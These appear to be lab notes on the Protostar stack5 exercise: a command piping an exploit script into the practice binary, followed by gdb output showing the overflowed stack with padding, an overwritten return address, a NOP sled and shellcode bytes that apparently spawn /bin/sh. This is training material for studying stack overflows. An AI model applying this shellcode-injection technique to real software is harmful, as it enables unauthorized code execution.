# inject-shellcode

```
(python exploit.py ; cat) | /opt/protostar/bin/stack5
```

```
(gdb) run < ~/exploit
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/stack5 < ~/exploit
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   ebp
0x080483c5 <main+1>:	mov    ebp,esp
0x080483c7 <main+3>:	and    esp,0xfffffff0
0x080483ca <main+6>:	sub    esp,0x50
0x080483cd <main+9>:	lea    eax,[esp+0x10]
0x080483d1 <main+13>:	mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave  
0x080483da <main+22>:	ret    
End of assembler dump.
0x80483da <main+22>:	ret    
0x80483db:	nop
0xbffff69c:	0xbffff6a6	0x90909090	0x90909090	0x90909090
0xbffff6ac:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff6bc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff6cc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff6dc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff6ec:	0x90909090	0x90909090	0x90909090	0x90909090

Breakpoint 2, 0x080483da in main (argc=Cannot access memory at address 0x5353535b) at stack5/stack5.c:11
11	in stack5/stack5.c
(gdb) x/100wx $esp-0x60
0xbffff63c:	0x080483d9	0xbffff650	0xb7ec6165	0xbffff658
0xbffff64c:	0xb7eada75	0x41414141	0x42424242	0x43434343
0xbffff65c:	0x44444444	0x45454545	0x46464646	0x47474747
0xbffff66c:	0x48484848	0x49494949	0x4a4a4a4a	0x4b4b4b4b
0xbffff67c:	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f
0xbffff68c:	0x50505050	0x51515151	0x52525252	0x53535353
0xbffff69c:	0xbffff6a6	0x90909090	0x90909090	0x90909090
0xbffff6ac:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff6bc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff6cc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff6dc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff6ec:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff6fc:	0x90909090	0x90909090	0x50c031cc	0x732f2f68
0xbffff70c:	0x622f6868	0xe3896e69	0xc289c189	0x80cd0bb0
0xbffff71c:	0xcd40c031	0x08040080	0x00000001	0xbffff744
0xbffff72c:	0x080483f0	0x080483e0	0xb7ff1040	0xbffff73c
0xbffff73c:	0xb7fff8f8	0x00000001	0xbffff888	0x00000000
0xbffff74c:	0xbffff8a2	0xbffff8b6	0xbffff8c0	0xbffff8e1
0xbffff75c:	0xbffff8f5	0xbffff8fd	0xbffff90f	0xbffff91f
0xbffff76c:	0xbffff932	0xbffff947	0xbffff95f	0xbffff96c
0xbffff77c:	0xbffff97b	0xbffff986	0xbffff99a	0xbffff9d8
0xbffff78c:	0xbffff9ef	0xbffffa00	0xbffffa19	0xbfffff09
0xbffff79c:	0xbfffff1d	0xbfffff2b	0xbfffff46	0xbfffff64
```
